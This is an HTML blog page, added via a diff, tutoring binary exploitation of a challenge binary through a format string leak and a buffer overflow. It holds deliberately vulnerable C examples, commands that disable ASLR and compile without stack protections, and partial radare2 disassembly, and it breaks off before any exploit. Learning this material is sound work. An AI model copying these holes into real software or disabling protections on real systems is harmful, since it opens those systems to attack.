@@ -1,0 +1,973 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>Binary Exploitation - Format String &#43; Buffer Overflow Vulnerability &middot; Congo</title>
+    <meta name="title" content="Binary Exploitation - Format String &#43; Buffer Overflow Vulnerability &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/fmt-bof/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/fmt-bof/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="Binary Exploitation - Format String &#43; Buffer Overflow Vulnerability">
+  <meta property="og:description" content="A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2018-09-12T22:25:00+00:00">
+    <meta property="article:modified_time" content="2018-09-12T22:25:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="Binary Exploitation - Format String &#43; Buffer Overflow Vulnerability">
+<meta name="twitter:description" content="A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "Binary Exploitation - Format String \u002b Buffer Overflow Vulnerability",
+    "headline": "Binary Exploitation - Format String \u002b Buffer Overflow Vulnerability",
+    
+    "abstract": "A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/fmt-bof\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2018",
+    "dateCreated": "2018-09-12T22:25:00\u002b00:00",
+    "datePublished": "2018-09-12T22:25:00\u002b00:00",
+    
+    "dateModified": "2018-09-12T22:25:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3623"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Binary Exploitation - Format String + Buffer Overflow Vulnerability
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2018-09-12 22:25:00 &#43;0000 UTC">12 September 2018</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">18 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.</p>
+<!-- more -->
+<h1 id="foreword" class="relative group">Foreword <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#foreword" aria-label="Anchor">#</a></span></h1><p>I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.</p>
+<blockquote>
+<p>Warning: This post will be long and detailed enough, so hang in there.</p>
+</blockquote>
+<h1 id="what-is-format-string-vulnerability" class="relative group">What is Format String Vulnerability? <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#what-is-format-string-vulnerability" aria-label="Anchor">#</a></span></h1><p>At first, let&rsquo;s start as we normally would. Format string as in C used to specify the the way data is going to be printed to the screen or console. Consider the following program:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">     <span class="nf">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="cm">/* No format specifier - here&#39;s the vulnerability */</span>
+</span></span><span class="line"><span class="cl">     <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Let&rsquo;s compile this:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:/tmp$ gcc -o new new.c
+</span></span><span class="line"><span class="cl">new.c: In <span class="k">function</span> ‘main’:
+</span></span><span class="line"><span class="cl">new.c:3:6: warning: implicit declaration of <span class="k">function</span> ‘printf’ <span class="o">[</span>-Wimplicit-function-declaration<span class="o">]</span>
+</span></span><span class="line"><span class="cl">      printf<span class="o">(</span>argv<span class="o">[</span>1<span class="o">])</span><span class="p">;</span> /* No format specifier */
+</span></span><span class="line"><span class="cl">      ^~~~~~
+</span></span><span class="line"><span class="cl">new.c:3:6: warning: incompatible implicit declaration of built-in <span class="k">function</span> ‘printf’
+</span></span><span class="line"><span class="cl">new.c:3:6: note: include ‘&lt;stdio.h&gt;’ or provide a declaration of ‘printf’
+</span></span><span class="line"><span class="cl">new.c:3:6: warning: format not a string literal and no format arguments <span class="o">[</span>-Wformat-security<span class="o">]</span>  &lt;--- Warning <span class="k">for</span> no format specification 
+</span></span></code></pre></div><p>Ah, so we got a warning(intended one), let&rsquo;s run:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:/tmp$ ./new Hello
+</span></span><span class="line"><span class="cl">Hello  &lt;-- Works fine!  
+</span></span><span class="line"><span class="cl">robin@oracle:/tmp$ ./new %x
+</span></span><span class="line"><span class="cl">d24f0e8 &lt;-- Wait, what?
+</span></span></code></pre></div><p>As you can see it works fine if we give it a string or something else but as soon as we give it a hex format specifier it gives hex data. In case you&rsquo;re wondering, that hex data is an actual address from the program stack. Thus, if there&rsquo;s no format specifier in a program and the data is being printed or shown accordingly, we can use a format specifier as an input parameter to leak stack addresses for own use.</p>
+<h1 id="what-is-buffer-overflow" class="relative group">What is Buffer Overflow? <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#what-is-buffer-overflow" aria-label="Anchor">#</a></span></h1><p>I&rsquo;m sure that most of you know what it is but still let&rsquo;s have a recap. Buffer overflow vulnerability occurs when a user gives more input than it was supposed to handle hence making the memory region to overflow by the input. If used smartly, it can be used for many gains.</p>
+<p>Consider the following program:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello %s&#34;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x000</span>
+</span></span></code></pre></div><p>PS: It was the only simple thing I could think of.</p>
+<p>So, as you can see it takes 10 characters as input and display them. Let&rsquo;s compile it and turn off the protections to make it work:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:/tmp$ sudo bash -c <span class="s1">&#39;echo 0 &gt; /proc/sys/kernel/randomize_va_space&#39;</span> <span class="c1"># Turn off the ASLR(Address Space Layout Randomization)</span>
+</span></span><span class="line"><span class="cl">robin@oracle:/tmp$ gcc -o bof -fno-stack-protector -z execstack bof.c  <span class="c1"># Makes Stack Executable and turn off stack smashing</span>
+</span></span></code></pre></div><p>It&rsquo;s compiled now, time to run it:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:/tmp$ ./bof
+</span></span><span class="line"><span class="cl">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span class="line"><span class="cl">Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span></span></code></pre></div><p>A Segementation Fault, we have a buffer overflow vulnerability here.</p>
+<blockquote>
+<p>Note: The Buffer Overflow program, consider it as a challenge and complete it. Go Pwn!</p>
+</blockquote>
+<h1 id="protections-on-binaries" class="relative group">Protections on Binaries <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#protections-on-binaries" aria-label="Anchor">#</a></span></h1><p>As you saw earlier, I used some gcc flags to turn off the standard protections. This process is commonly referred to as hardening as these protections prevents the vulnerability to be exploited and hence makes it harder for us to exploit it. These protections includes:-</p>
+<ul>
+<li>Buffer overflow protection</li>
+<li>Stack overwriting protection</li>
+<li>Position independent executables (see Address space layout randomization)</li>
+<li>Binary stirring (randomizing the address of basic blocks)</li>
+<li>Pointer masking (protection against code injection)</li>
+<li>Control flow randomization (to protect against control flow diversion)</li>
+</ul>
+<p>Following are the protections, we will deal with:-</p>
+<h4 id="stack-canaries" class="relative group">Stack Canaries <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#stack-canaries" aria-label="Anchor">#</a></span></h4><p>This method works by placing a small integer, the value of which is randomly chosen at program start, in memory just before the stack return pointer. Most buffer overflows overwrite memory from lower to higher memory addresses, so in order to overwrite the return pointer (and thus take control of the process) the canary value must also be <strong>overwritten</strong>. This value is checked to make sure it has not changed before a routine uses the return pointer on the stack.</p>
+<h4 id="non-executable-stack" class="relative group">Non-Executable Stack <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#non-executable-stack" aria-label="Anchor">#</a></span></h4><p>Another approach to preventing stack buffer overflow exploitation is to enforce a memory policy on the stack memory region that disallows execution from the stack. This means that in order to execute shellcode from the stack an attacker must either find a way to disable the execution protection from memory, or find a way to put her/his shellcode payload in a non-protected region of memory.
+Even if this were not so, there are other ways. The most damning is the so-called return to libc method for shellcode creation. In this attack the malicious payload will load the stack not with shellcode, but with a proper call stack so that execution is vectored to a chain of standard library calls, usually with the effect of disabling memory execute protections and allowing shellcode to run as normal. This works because the execution never actually vectors to the stack itself.
+A variant of return-to-libc is return-oriented programming (ROP), which sets up a series of return addresses, each of which executes a small sequence of cherry-picked machine instructions within the existing program code or system libraries, sequence which ends with a return. These so-called gadgets each accomplish some simple register manipulation or similar execution before returning, and stringing them together achieves the attacker&rsquo;s ends. It is even possible to use &ldquo;returnless&rdquo; return-oriented programming by exploiting instructions or groups of instructions that behave much like a return instruction.</p>
+<blockquote>
+<p>This is an ongoing series on my blog.</p>
+</blockquote>
+<h1 id="__main__" class="relative group"><strong>main</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#__main__" aria-label="Anchor">#</a></span></h1><p>Now, let&rsquo;s get started:-</p>
+<h5 id="attached-files" class="relative group">Attached files: <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#attached-files" aria-label="Anchor">#</a></span></h5><p><a href="/files/binary/q3">q3</a></p>
+<h3 id="analysing-the-binary" class="relative group">Analysing the binary <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analysing-the-binary" aria-label="Anchor">#</a></span></h3><p>Let&rsquo;s analyse or reverse enginner the binary first, I&rsquo;ll be using radare2 for disassembly and IDA Pro for decompiled functions:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~</span><span class="nf">$</span> <span class="no">r2</span> <span class="p">-</span><span class="no">AAAA</span> <span class="no">q3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">--</span><span class="nf">snip--</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[0</span><span class="nf">x00000670</span><span class="p">]</span><span class="err">&gt;</span> <span class="no">afl</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000</span>    <span class="mi">3</span> <span class="mi">72</span>   <span class="p">-</span><span class="err">&gt;</span> <span class="mi">73</span>   <span class="no">sym.imp.__libc_start_main</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000005f8</span>    <span class="mi">3</span> <span class="mi">23</span>           <span class="no">sym._init</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000620</span>    <span class="mi">1</span> <span class="mi">6</span>            <span class="no">sym.imp.puts</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000630</span>    <span class="mi">1</span> <span class="mi">6</span>            <span class="no">sym.imp.__stack_chk_fail</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000640</span>    <span class="mi">1</span> <span class="mi">6</span>            <span class="no">sym.imp.printf</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000650</span>    <span class="mi">1</span> <span class="mi">6</span>            <span class="no">sym.imp.fgets</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000660</span>    <span class="mi">1</span> <span class="mi">6</span>            <span class="no">sub.__cxa_finalize_248_660</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000670</span>    <span class="mi">1</span> <span class="mi">43</span>           <span class="no">entry0</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000006a0</span>    <span class="mi">4</span> <span class="mi">50</span>   <span class="p">-</span><span class="err">&gt;</span> <span class="mi">40</span>   <span class="no">sym.deregister_tm_clones</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000006e0</span>    <span class="mi">4</span> <span class="mi">66</span>   <span class="p">-</span><span class="err">&gt;</span> <span class="mi">57</span>   <span class="no">sym.register_tm_clones</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000730</span>    <span class="mi">4</span> <span class="mi">49</span>           <span class="no">sym.__do_global_dtors_aux</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000770</span>    <span class="mi">1</span> <span class="mi">10</span>           <span class="no">entry1.init</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000077a</span>    <span class="mi">3</span> <span class="mi">182</span>          <span class="no">sym.main</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000830</span>    <span class="mi">4</span> <span class="mi">101</span>          <span class="no">sym.__libc_csu_init</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000008a0</span>    <span class="mi">1</span> <span class="mi">2</span>            <span class="no">sym.__libc_csu_fini</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000008a4</span>    <span class="mi">1</span> <span class="mi">9</span>            <span class="no">sym._fini</span>
+</span></span></code></pre></div><p>No special function is seen here, let&rsquo;s disassemble <code>main</code>:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[0</span><span class="nf">x00000670</span><span class="p">]</span><span class="err">&gt;</span> <span class="no">pdf</span> <span class="err">@</span><span class="no">main</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">;-- main:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.main</span> <span class="mi">182</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>   <span class="nf">sym.main</span> <span class="p">()</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="c1">; var FILE local_28h @ rbp-0x28
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="c1">; var int local_20h @ rbp-0x20
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="c1">; var int local_18h @ rbp-0x18
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="c1">; var int local_8h @ rbp-0x8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>              <span class="c1">; DATA XREF from 0x0000068d (entry0)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000077a</span>      <span class="mi">55</span>             <span class="no">push</span> <span class="no">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000077b</span>      <span class="mi">4889</span><span class="no">e5</span>         <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000077e</span>      <span class="mi">4883</span><span class="no">ec30</span>       <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x30</span>               <span class="c1">; &#39;0&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000782</span>      <span class="mi">64488</span><span class="no">b042528.</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">0x28</span><span class="p">]</span>    <span class="c1">; [0x28:8]=0x19e0 ; &#39;(&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000078b</span>      <span class="mi">488945</span><span class="no">f8</span>       <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_8h</span><span class="p">],</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000078f</span>      <span class="mi">31</span><span class="no">c0</span>           <span class="no">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000791</span>      <span class="mi">48</span><span class="no">c745e00000.</span>  <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_20h</span><span class="p">],</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000799</span>      <span class="mi">48</span><span class="no">c745e80000.</span>  <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_18h</span><span class="p">],</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007a1</span>      <span class="mi">488</span><span class="no">b05680820.</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">obj.stdin</span><span class="p">]</span>  <span class="c1">; loc.stdin ; [0x201010:8]=0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007a8</span>      <span class="mi">488945</span><span class="no">d8</span>       <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_28h</span><span class="p">],</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007ac</span>      <span class="mi">488</span><span class="no">d3d010100.</span>  <span class="no">lea</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">qword</span> <span class="no">str.Enter_name_</span><span class="p">:</span> <span class="c1">; 0x8b4 ; &#34;Enter name : &#34; ; const char * format
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007b3</span>      <span class="no">b800000000</span>     <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007b8</span>      <span class="no">e883feffff</span>     <span class="no">call</span> <span class="no">sym.imp.printf</span>         <span class="c1">; int printf(const char *format)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007bd</span>      <span class="mi">488</span><span class="no">b55d8</span>       <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_28h</span><span class="p">]</span>  <span class="c1">; FILE *stream
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007c1</span>      <span class="mi">488</span><span class="no">d45e0</span>       <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_20h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007c5</span>      <span class="no">be10000000</span>     <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x10</span>               <span class="c1">; int size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007ca</span>      <span class="mi">4889</span><span class="no">c7</span>         <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>                <span class="c1">; char *s
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007cd</span>      <span class="no">e87efeffff</span>     <span class="no">call</span> <span class="no">sym.imp.fgets</span>          <span class="c1">; char *fgets(char *s, int size, FILE *stream)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007d2</span>      <span class="mi">488</span><span class="no">d3de90000.</span>  <span class="no">lea</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">qword</span> <span class="no">str.Hello</span>    <span class="c1">; 0x8c2 ; &#34;Hello&#34; ; const char * s
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007d9</span>      <span class="no">e842feffff</span>     <span class="no">call</span> <span class="no">sym.imp.puts</span>           <span class="c1">; int puts(const char *s)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007de</span>      <span class="mi">488</span><span class="no">d45e0</span>       <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_20h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007e2</span>      <span class="mi">4889</span><span class="no">c7</span>         <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>                <span class="c1">; const char * format
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007e5</span>      <span class="no">b800000000</span>     <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
